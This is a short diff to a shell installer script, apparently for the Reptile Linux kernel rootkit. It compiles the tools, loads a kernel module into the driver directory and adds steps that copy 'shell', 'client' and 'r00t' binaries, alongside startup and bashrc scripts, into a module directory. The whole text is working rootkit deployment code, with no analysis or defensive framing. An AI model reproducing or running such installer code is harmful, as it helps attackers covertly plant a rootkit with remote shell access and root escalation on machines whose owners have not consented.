@@ -180,7 +180,7 @@ function reptile_install {
 
 	config_gen && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
-	
+
 	echo -ne "Compiling... "
 	make all > /dev/null 2>&1 && \
 	make clean > /dev/null 2>&1 && \
@@ -190,11 +190,15 @@ function reptile_install {
 	echo -n "Copying binaries to /$MODULE... "
 	mkdir -p /$MODULE && \
 	cp bin/$MODULE* /$MODULE && \
+	cp bin/shell /$MODULE/$MODULE"_shell" && \
+	cp bin/client /$MODULE/$MODULE"_client" && \
+	cp bin/r00t /$MODULE/$MODULE"_r00t" && \
 	cp scripts/start.sh /$MODULE/$MODULE"_start.sh" && \
 	cp scripts/bashrc /$MODULE/$MODULE"_rc" && \
 	rm -rf bin && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
-    	echo -ne "Installing... "
+
+	echo -ne "Installing... "
     
 	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     
